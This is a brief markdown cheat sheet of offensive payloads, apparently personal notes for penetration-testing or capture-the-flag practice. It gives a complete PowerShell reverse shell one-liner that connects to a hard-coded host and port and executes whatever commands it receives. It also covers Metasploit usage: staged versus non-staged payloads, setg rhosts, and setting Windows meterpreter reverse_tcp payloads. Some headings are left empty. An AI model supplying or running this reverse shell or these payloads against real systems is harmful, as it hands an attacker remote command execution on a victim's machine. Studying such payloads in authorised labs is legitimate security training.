# Payloads

## Basic powershell reverse shell

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.98',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
## reverse shell dll

```


```
## reverse shell .bat

## Staged vs non staged
```
In Metasploit, the “/” character is used to denote whether a payload is staged or not,
so shell_reverse_tcp at index 20 is not staged, whereas shell/reverse_tcp at index 15 is.
```

## msfvenom

![Pasted image 20230508141045](https://github.com/dbissell6/Shadow_Stone/assets/50979196/988055f3-d9a3-4b0a-9e5b-be91b0886c30)

## msfconsole

g will set variable as global, useful when trying different exploits
`setg rhosts 10.10.10.10`


![Pasted image 20230508141206](https://github.com/dbissell6/Shadow_Stone/assets/50979196/efbcf2e5-fec1-4485-ba20-5e988702c92b)


`set payload windows/meterpreter/reverse_tcp`


### show system arch vs payload arch

![Pasted image 20230508154055](https://github.com/dbissell6/Shadow_Stone/assets/50979196/31f9ac3d-5efb-4b31-9237-f0b652376925)

Now can
```
set payload windows/x64/meterpreter/reverse_tcp
```

